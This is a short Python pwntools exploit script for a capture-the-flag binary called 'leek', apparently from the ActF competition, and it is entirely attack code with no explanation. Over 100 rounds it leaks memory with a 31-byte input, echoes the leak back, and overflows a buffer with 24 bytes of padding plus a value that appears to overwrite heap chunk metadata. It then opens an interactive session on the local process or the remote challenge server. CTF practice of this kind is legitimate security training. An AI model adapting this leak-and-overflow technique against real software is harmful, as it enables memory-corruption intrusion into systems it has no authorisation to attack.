#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("leek")
libc = elf.libc

local = True 
if local:
    p = process("./leek")
    #gdb.attach(p,gdbscript='''''')
else:
    p = remote('challs.actf.co', 31310)

elf = context.binary = ELF('./leek', checksec=False)

for i in range(100):
    p.sendlineafter(b"VERFLOWS!!):", b"a"*31)
    p.recvuntil(b"a"*31 + b"\n")
    leak = p.recv(32)
    p.send(leak)
    p.sendline(b"a"*24 + p64(0x31))
    print("Round", int(i+1))

p.interactive()
